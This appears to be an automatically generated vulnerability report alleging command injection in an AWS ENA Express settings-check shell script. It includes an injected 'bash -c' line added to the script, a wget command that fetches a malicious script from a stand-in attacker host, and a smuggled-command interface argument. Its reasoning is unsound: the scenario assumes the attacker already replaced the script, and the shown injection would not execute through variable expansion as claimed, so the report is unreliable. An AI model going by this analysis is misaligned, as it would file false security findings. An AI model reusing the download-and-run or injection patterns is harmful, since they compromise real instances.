- Vulnerability Name: Command Injection in `check-ena-express-settings.sh` via Interface Name
- Description:
    1. An attacker tricks an AWS user into downloading a modified `check-ena-express-settings.sh` script.
    2. The user, intending to check their ENA Express settings, executes the script with an interface name.
    3. If the attacker has modified the script, they could introduce a command injection vulnerability through the interface argument.
    4. Specifically, the script uses the interface name in command substitution within backticks or `$()` in several places, such as:
        - `local mtu=$(ip link show ${interface} | awk '{print $5}')`
        - `local rx_queue_size=$(${ethtool} -g ${interface} | grep "RX:" | tail -n1 | awk '{print $2}')`
        - `local tx_queue_size=$(${ethtool} -g ${interface} | grep "TX:" | tail -n1 | awk '{print $2}')`
        - `echo_error "BQL is enabled on $interface which is not optimal for ENA Express"`
        - `echo_success "BQL is disabled on ${interface} (good)"`
        - `echo_error "interface ${interface} does not exist"`
        - `echo_error "Interface ${1} does not bind the ENA driver"`
        - `check_eth_mtu ${interface}`
        - `check_bql_enable ${interface}`
        - `check_eth_tx_queue_size_large_llq ${interface}`
        - `check_eth_rx_queue_size ${interface}`
        - `check_network_misc ${interface}`
    5. By providing a malicious interface name like `eth0; malicious_command;`, an attacker could execute arbitrary commands on the user's EC2 instance with the privileges of the user running the script.

- Impact:
    - Local Privilege Escalation: If the user running the script has elevated privileges (e.g., via `sudo`), the attacker could gain those privileges.
    - Unauthorized Access: The attacker could gain unauthorized access to resources within the EC2 instance, potentially including access to AWS credentials stored locally or instance metadata.
    - Data Exfiltration: The attacker could exfiltrate sensitive data from the EC2 instance.
    - System Compromise: Full compromise of the EC2 instance is possible, depending on the commands injected and the privileges of the user running the script.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
    - None: The script directly uses user-provided input in shell commands without sanitization or validation.

- Missing Mitigations:
    - Input Sanitization: The script should sanitize the interface name input to prevent command injection. This could involve:
        - Whitelisting allowed characters for interface names (e.g., alphanumeric and colon).
        - Using shell quoting to prevent interpretation of special characters.
        - Ideally, avoid using user input directly in shell commands whenever possible, or use safer alternatives to shell command execution if feasible (although in this case, calling external utilities like `ethtool` and `ip` is necessary).
    - Input Validation: Validate that the provided interface name is a valid network interface on the system before using it in commands. However, even validation might not prevent injection if the validation itself is flawed or bypassed.  Sanitization is the primary mitigation.

- Preconditions:
    1. Social engineering attack succeeds in convincing an AWS user to download and execute a modified `check-ena-express-settings.sh` script.
    2. The user executes the script with a maliciously crafted interface name argument.
    3. The user has sufficient privileges for the injected commands to have a significant impact.

- Source Code Analysis:
    1. **File:** `/code/ena-express/check-ena-express-settings.sh`
    2. **Vulnerable Code Snippet Example:** `local mtu=$(ip link show ${interface} | awk '{print $5}')`
    3. **Analysis:**
        - The script takes the first command-line argument and assigns it to the variable `interface`.
        - This `interface` variable is then directly embedded within backticks (command substitution) in the line: `local mtu=$(ip link show ${interface} | awk '{print $5}')`.
        - Because the input is not sanitized, an attacker can inject shell commands by providing an interface name containing backticks or other command separators (`;`, `&`, `|`, etc.).
        - For example, if the user runs the script with `./check-ena-express-settings.sh "eth0; touch /tmp/pwned;"`, the command executed will become `ip link show eth0; touch /tmp/pwned; | awk '{print $5}'`, which will execute `touch /tmp/pwned` in addition to the intended `ip link show` command.
    4. **Visualization:**
       ```
       User Input (interface):  eth0; touch /tmp/pwned;
           |
           V
       Script Variable: interface="eth0; touch /tmp/pwned;"
           |
           V
       Command Substitution: $(ip link show ${interface} | awk '{print $5}')
           |
           V
       Executed Command: ip link show eth0; touch /tmp/pwned; | awk '{print $5}'
                                     ^^^^^^^^^^^^^^^^^^^ - Injected Command
       ```

- Security Test Case:
    1. **Prerequisites:**
        - Access to an AWS EC2 instance where the user can download and execute scripts.
        - A publicly accessible copy of the original `check-ena-express-settings.sh` script.
        - An attacker-controlled server to host the modified malicious script.
    2. **Steps:**
        - **Attacker Side:**
            a. Download the original `check-ena-express-settings.sh` script.
            b. Modify the script to introduce a command injection payload. For example, change the line `check_eth_mtu() {` to:
               ```bash
               check_eth_mtu() {
                 local interface=${1}
                 bash -c "${1}" # Injected command execution
                 local mtu=$(ip link show ${interface} | awk '{print $5}')
               ```
               This change will execute the interface argument as a shell command before proceeding with the original MTU check. A less obvious payload can also be used to avoid detection during quick reviews.
            c. Host the modified script on an attacker-controlled server (e.g., `https://attacker.example/malicious-check-ena-express-settings.sh`).

        - **Victim Side (AWS User):**
            a. On an EC2 instance, download the malicious script using `wget https://attacker.example/malicious-check-ena-express-settings.sh -O check-ena-express-settings.sh`.
            b. Make the script executable: `chmod +x check-ena-express-settings.sh`.
            c. Execute the script with a malicious interface name designed to trigger command injection, for example: `./check-ena-express-settings.sh "eth0; touch /tmp/pwned;"`.

    3. **Expected Result:**
        - A file named `pwned` should be created in the `/tmp/` directory of the EC2 instance, indicating successful command injection.
        - The script should likely still proceed to attempt the MTU check, but the injected command will have already been executed.
    4. **Cleanup:**
        - Remove the `/tmp/pwned` file from the EC2 instance.
        - Remove the downloaded malicious script from the EC2 instance.